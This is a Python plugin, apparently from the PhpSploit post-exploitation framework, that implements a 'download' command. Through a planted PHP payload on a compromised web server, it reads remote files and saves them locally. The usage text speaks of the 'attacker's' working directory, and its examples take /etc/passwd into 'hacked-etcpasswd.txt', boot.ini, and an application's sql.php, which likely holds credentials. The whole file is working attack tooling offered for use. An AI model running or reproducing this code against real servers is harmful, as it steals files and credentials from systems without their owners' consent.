r"""Download a remote file

SYNOPSIS:
    download [-f] <REMOTE-FILE> [<LOCAL-PATH>]

OPTIONS:
    -f
        overwrite LOCAL-PATH without user confirmation.

DESCRIPTION:
    Download a remote file to your local system.
    - REMOTE-FILE must be readable.
    - LOCAL-PATH must be a writable file or directory.
    - If LOCAL-PATH is a directory, REMOTE-FILE will be downloaded
    into it, preserving original file name.
    - if LOCAL-PATH is not provided, REMOTE-FILE is downloaded
    to attacker's current working directory (which can be known
    with `lrun pwd` command).
    - Unless '-f' option has been provided, user confirmation is
    needed to overwrite LOCAL-PATH (if it already exists).

LIMITATIONS:
    Recursive directory and multiple file downloads are not available.

EXAMPLES:
    > download C:\boot.ini /tmp/pentest/
      - Download the remote boot.ini file into your local dir
    > download -f /etc/passwd ./hacked-etcpasswd.txt
      - Download the current remote passwd file and force copy
    > download /srv/www/inc/sql.php
      - Download the sql.php file to the current local directory

AUTHOR:
    nil0x42 <http://goo.gl/kb2wf>
"""


import sys
import os
import base64

import utils
import ui.input
from datatypes import Path

from api import plugin
from api import server

if not 2 <= len(plugin.argv) <= 4:
    sys.exit(plugin.help)


if plugin.argv[1] == "-f":
    force = True
    arg1 = 2
    arg2 = 3
    arglen = len(plugin.argv) - 1
else:
    force = False
    arg1 = 1
    arg2 = 2
    arglen = len(plugin.argv)

relpath = plugin.argv[arg1]

local_relpath = plugin.argv[arg2] if arglen == 3 else os.getcwd()
abspath = server.path.abspath(relpath)
local_abspath = utils.path.truepath(local_relpath)
local_dirname = local_abspath
local_basename = server.path.basename(abspath)

if not os.path.isdir(local_dirname):
    local_dirname = os.path.dirname(local_dirname)
    if os.path.isdir(local_dirname):
        local_basename = os.path.basename(local_abspath)
    else:
        sys.exit(f"{local_dirname}: Invalid local directory")

try:
    Path(local_dirname, mode='w')
except ValueError:
    sys.exit(f"{local_dirname}: Local directory not writable")

local_abspath = os.path.join(local_dirname, local_basename)

if not force and os.path.exists(local_abspath):
    if os.path.isfile(local_abspath):
        question = "Local destination %s already exists, overwrite it ?"
        if ui.input.Expect(False)(question % local_abspath):
            sys.exit("File transfer aborted")
    else:
        sys.exit(f"Local destination {local_abspath} already exists")

payload = server.payload.Payload("payload.php")
payload['FILE'] = abspath

response = payload.send()

file = Path(local_abspath)
try:
    file.write(base64.b64decode(response), bin_mode=True)
except ValueError as err:
    sys.exit(f"Couldn't download file to {local_abspath}: {err}")

print(f"[*] Download complete: {abspath} -> {local_abspath}")
